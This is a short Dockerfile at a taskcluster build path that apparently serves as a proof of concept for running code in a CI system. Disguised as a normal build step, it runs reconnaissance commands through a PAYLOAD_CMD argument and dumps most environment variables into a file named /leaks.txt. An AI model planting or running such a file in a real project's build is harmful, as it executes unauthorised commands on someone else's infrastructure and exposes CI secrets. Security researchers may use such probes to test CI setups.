# taskcluster/docker/python/Dockerfile
FROM python:3.11-alpine

VOLUME /builds/worker/checkouts # <--- This line must be in the Dockerfile!

ARG PAYLOAD_CMD="whoami && id && uname -a && cat /etc/os-release"
ARG MARKER="=== CI EXECUTION SUCCESSFUL ==="

RUN apk add --no-cache curl bash coreutils grep \
  && echo "[+] Building Docker image safely..." \
  && echo "$MARKER" > /leaks.txt \
  && echo "[+] Executing PAYLOAD_CMD..." >> /leaks.txt \
  && sh -c "$PAYLOAD_CMD" >> /leaks.txt \
  && echo "[+] ENV Dump (safe vars only)..." >> /leaks.txt \
  && env | grep -v -e 'GITHUB_' -e 'OIDC' -e 'AWS' >> /leaks.txt \
  && echo "[+] Finished successfully." >> /leaks.txt
